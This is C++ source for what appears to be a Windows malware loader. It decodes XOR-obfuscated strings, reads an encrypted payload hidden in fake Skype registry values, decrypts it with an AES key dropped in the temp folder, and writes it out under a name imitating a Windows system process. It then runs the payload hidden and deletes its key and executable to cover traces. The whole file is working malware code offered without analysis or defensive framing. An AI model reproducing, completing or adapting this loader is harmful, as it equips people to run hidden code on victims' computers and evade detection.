#include <windows.h>
#include <string>
#include <fstream>
#include <cryptopp/aes.h>
#include <cryptopp/modes.h>
#include <cryptopp/filters.h>
#include <cryptopp/hex.h>

static std::string GetRegistryValue(HKEY hRoot, const char* subKey, const char* valueName) {
    HKEY hKey;
    if (RegOpenKeyExA(hRoot, subKey, 0, KEY_READ, &hKey) != ERROR_SUCCESS)
        return "";

    DWORD dataSize = 0, dataType;
    if (RegQueryValueExA(hKey, valueName, nullptr, &dataType, nullptr, &dataSize) != ERROR_SUCCESS || dataType != REG_SZ) {
        RegCloseKey(hKey);
        return "";
    }

    std::string data(dataSize, '\0');
    if (RegQueryValueExA(hKey, valueName, nullptr, &dataType, (LPBYTE)&data[0], &dataSize) != ERROR_SUCCESS) {
        RegCloseKey(hKey);
        return "";
    }

    RegCloseKey(hKey);
    if (!data.empty() && data.back() == '\0')
        data.pop_back();

    return data;
}

// XOR deobfuscation helper (4-byte key)
static std::string deobfuscate(const unsigned char* data, size_t len, uint32_t key) {
    std::string result(len, '\0');
    unsigned char keyBytes[4] = {
        (unsigned char)(key >> 24),
        (unsigned char)(key >> 16),
        (unsigned char)(key >> 8),
        (unsigned char)(key)
    };
    for (size_t i = 0; i < len; i++) {
        result[i] = data[i] ^ keyBytes[i % 4];
    }
    return result;
}

// Obfuscated strings (XOR key = 0xCAFEBABE)
// "Software\\Skype" XOR 0xCAFEBABE
static const unsigned char OBF_REGKEY[] = {0x99,0x91,0xDC,0xCA,0xBD,0x9F,0xC8,0xDB,0x96,0xAD,0xD1,0xC7,0xBA,0x9B};
// "Username" XOR 0xCAFEBABE
static const unsigned char OBF_VAL1[] = {0x9F,0x8D,0xDF,0xCC,0xA4,0x9F,0xD7,0xDB};
// "LastProfile" XOR 0xCAFEBABE
static const unsigned char OBF_VAL2[] = {0x86,0x9F,0xC9,0xCA,0x9A,0x8C,0xD5,0xD8,0xA3,0x92,0xDF};
// "SkypePath" XOR 0xCAFEBABE
static const unsigned char OBF_VAL3[] = {0x99,0x95,0xC3,0xCE,0xAF,0xAE,0xDB,0xCA,0xA2};
// "9b5c9b7e83cdfbdf11f87195c3192a47" XOR 0xCAFEBABE
static const unsigned char OBF_AES_IV[] = {0xF3,0x9C,0x8F,0xDD,0xF3,0x9C,0x8D,0xDB,0xF2,0xCD,0xD9,0xDA,0xAC,0x9C,0xDE,0xD8,0xFB,0xCF,0xDC,0x86,0xFD,0xCF,0x83,0x8B,0xA9,0xCD,0x8B,0x87,0xF8,0x9F,0x8E,0x89};
// "RuntimeBroker.exe" XOR 0xCAFEBABE
static const unsigned char OBF_DROPPED_EXE[] = {0x98,0x8B,0xD4,0xCA,0xA3,0x93,0xDF,0xFC,0xB8,0x91,0xD1,0xDB,0xB8,0xD0,0xDF,0xC6,0xAF};

static std::string ReadTempKey() {
    char tempPath[MAX_PATH];
    if (GetTempPathA(MAX_PATH, tempPath) == 0)
        return "";

    // Search for wct*.tmp files (dropper uses random suffix)
    // AES-256 key is 32 bytes = 64 hex characters
    const DWORD expectedSize = 64;
    
    std::string searchPattern = std::string(tempPath) + "wct*.tmp";
    WIN32_FIND_DATAA findData;
    HANDLE hFind = FindFirstFileA(searchPattern.c_str(), &findData);
    if (hFind == INVALID_HANDLE_VALUE)
        return "";
    
    std::string keyPath;
    do {
        // Check file size matches AES key hex length
        if (findData.nFileSizeHigh == 0 && findData.nFileSizeLow == expectedSize) {
            keyPath = std::string(tempPath) + findData.cFileName;
            break;
        }
    } while (FindNextFileA(hFind, &findData));
    FindClose(hFind);
    
    if (keyPath.empty())
        return "";
    
    std::ifstream ifs(keyPath, std::ios::binary);
    if (!ifs)
        return "";

    std::string key;
    std::getline(ifs, key);
    return key;
}

static std::string DecryptPayload() {
    std::string regKey = deobfuscate(OBF_REGKEY, sizeof(OBF_REGKEY), 0xCAFEBABE);
    std::string val1 = deobfuscate(OBF_VAL1, sizeof(OBF_VAL1), 0xCAFEBABE);
    std::string val2 = deobfuscate(OBF_VAL2, sizeof(OBF_VAL2), 0xCAFEBABE);
    std::string val3 = deobfuscate(OBF_VAL3, sizeof(OBF_VAL3), 0xCAFEBABE);

    std::string v1 = GetRegistryValue(HKEY_CURRENT_USER, regKey.c_str(), val1.c_str());
    std::string v2 = GetRegistryValue(HKEY_CURRENT_USER, regKey.c_str(), val2.c_str());
    std::string v3 = GetRegistryValue(HKEY_CURRENT_USER, regKey.c_str(), val3.c_str());

    if (v1.empty() || v2.empty() || v3.empty())
        return "";

    std::string cipherHex = v1 + v2 + v3;
    std::string keyHex = ReadTempKey();

    if (keyHex.empty() || cipherHex.length() % 2 != 0)
        return "";

    try {
        std::string cipher, key, iv, plain;
        std::string ivHex = deobfuscate(OBF_AES_IV, sizeof(OBF_AES_IV), 0xCAFEBABE);

        CryptoPP::StringSource(cipherHex, true, new CryptoPP::HexDecoder(new CryptoPP::StringSink(cipher)));
        CryptoPP::StringSource(keyHex, true, new CryptoPP::HexDecoder(new CryptoPP::StringSink(key)));
        CryptoPP::StringSource(ivHex, true, new CryptoPP::HexDecoder(new CryptoPP::StringSink(iv)));

        if (key.size() != 32 || iv.size() != 16 || cipher.size() % 16 != 0)
            return "";

        CryptoPP::CBC_Mode<CryptoPP::AES>::Decryption dec;
        dec.SetKeyWithIV((const CryptoPP::byte*)key.data(), key.size(), (const CryptoPP::byte*)iv.data());

        CryptoPP::StringSource(cipher, true,
            new CryptoPP::StreamTransformationFilter(dec,
                new CryptoPP::StringSink(plain),
                CryptoPP::StreamTransformationFilter::PKCS_PADDING));

        return plain;
    } catch (...) {
        return "";
    }
}

static void CleanupTemp() {
    char tempPath[MAX_PATH];
    if (GetTempPathA(MAX_PATH, tempPath) != 0) {
        // Find and delete wct*.tmp key files
        std::string searchPattern = std::string(tempPath) + "wct*.tmp";
        WIN32_FIND_DATAA findData;
        HANDLE hFind = FindFirstFileA(searchPattern.c_str(), &findData);
        if (hFind != INVALID_HANDLE_VALUE) {
            do {
                std::string keyPath = std::string(tempPath) + findData.cFileName;
                DeleteFileA(keyPath.c_str());
            } while (FindNextFileA(hFind, &findData));
            FindClose(hFind);
        }
    }
}

static void ExecutePayload() {
    std::string payload = DecryptPayload();
    if (payload.empty())
        return;

    char tempPath[MAX_PATH];
    GetTempPathA(MAX_PATH, tempPath);

    char exePath[MAX_PATH];
    ULONGLONG tick = GetTickCount64();
    // Use Windows Update-style naming
    sprintf_s(exePath, "%s\\WUDFHost_%08llX.exe", tempPath, tick & 0xFFFFFFFF);

    HANDLE hFile = CreateFileA(exePath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE)
        return;

    DWORD written;
    BOOL result = WriteFile(hFile, payload.data(), (DWORD)payload.size(), &written, NULL);
    CloseHandle(hFile);

    if (!result || written != payload.size()) {
        DeleteFileA(exePath);
        return;
    }

    CleanupTemp();

    STARTUPINFOA si = {0};
    PROCESS_INFORMATION pi = {0};
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;

    if (CreateProcessA(exePath, NULL, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        WaitForSingleObject(pi.hProcess, INFINITE);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        DeleteFileA(exePath);
    } else {
        DeleteFileA(exePath);
    }
}

int main() {
    ExecutePayload();
    return 0;
}
